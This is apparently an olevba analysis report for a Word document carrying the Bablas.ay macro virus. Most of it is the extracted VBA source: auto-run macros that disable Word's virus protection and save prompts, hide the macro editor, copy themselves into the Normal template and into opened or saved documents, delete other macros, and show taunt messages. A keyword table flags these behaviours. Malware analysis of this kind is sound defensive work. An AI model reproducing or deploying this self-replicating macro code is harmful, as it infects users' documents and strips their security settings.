olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.ay-97fbbfa6d9847351db067fb910c0b113fbdd6f34
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.ay-97fbbfa6d9847351db067fb910c0b113fbdd6f34 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Bablas.ay-97fbbfa6d9847351db067fb910c0b113fbdd6f34 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ShowMessage()
    H = Time
    If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbWednesday Or _
        WeekDay(Date) = vbSunday Or WeekDay(Date) = vbMonday) And _
        Time < TimeValue("23:30:00") Then
    For i = 1 To 10
        Beep
    Next i
    H = MsgBox("Salam Ti BEBEN Jugovic... kanggo..Nugeulis Tea ...." & Chr(13) & _
    "Kirim-kirim buat Laleur Band " & Chr(34) & "  Radio GMR, OZ, Mara, Dahlia dll" & Chr(13) & Chr(13) & _
    " Virus ieu Bukan Sembarang Virus :-)   ! " & Chr(13) & _
    "Tapi Virus anu Matih Kaampuhanana Tidak Diragukan Khasiatnya." & _
    Chr(13) & "Jadi, tong geumpeur OK!" & Chr(13) & Chr(13) & _
    "Laleur mapay areuy Cing Cangkoek Aya Ucing Dinu Poek " & Chr(13) & _
    "Menerima Lowongan Pacar Segera Daftarkan Diri Anda )", vbOKOnly + vbExclamation, "Salam Kanggo Nu Rumaos")
    End If
End Sub
Sub Bablas()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
    Options.Application.ShowVisualBasicEditor = False
End Sub
Sub ToolsMacro()
    H = MsgBox("Bade ngedit mana sempat.....)", vbExclamation + vbOKOnly)
End Sub
Sub ViewVbCode()
    ToolsMacro
End Sub
Sub FileTemplates()
    ToolsMacro
End Sub
Sub HelpAbout()
    H = MsgBox("Nuhun Pisan Jaketna di pangyeuseukeun." & Chr(13) & Chr(13) & _
    "Angge Payungna bilih ka hujanan,... !", vbOKOnly + vbExclamation, "Mugi-mugi jadi Istri Sholihat")
End Sub
Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub
Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "ELF - LEDENG....mau lewat dulu ?"
    ActiveWindow.Caption = "SBG -- BDG "
End Sub
Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub
Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "Module1" Then DocOk = True
        If Obj.Name <> "Module1" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.StatusBar = "Copying From Normal Template to " _
        + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="Module1", Object:=wdOrganizerObjectProjectItems
    End If
End Sub
Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "Module1" Then NorOk = True
        If Obj.Name <> "Module1" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.StatusBar = "Copying From " + ActiveDocument.Name + _
        " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Module1", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub
Sub AutoExit()
    ShowMessage
    Application.Quit
End Sub
Sub FileOpen()
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros False
End Sub
Sub AutoOpen()
    Application.ShowVisualBasicEditor = False
    Bablas
    ChangeCap
    SikatTemplate
    On Error Resume Next
    NormalTemplate.Save
    RestoreCap
End Sub
Sub AutoClose()
    SikatDocument
End Sub
Sub FileClose()
    AutoClose
End Sub
Sub FileSave()
    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub
Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
        Normal.Module1.SikatDocument
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:00"), "Normal.Module1.Ancurin"
    End If
End Sub
Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Bablas
    Application.OnTime Now + TimeValue("00:00:00"), "Normal.Module1.Ancurin"
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

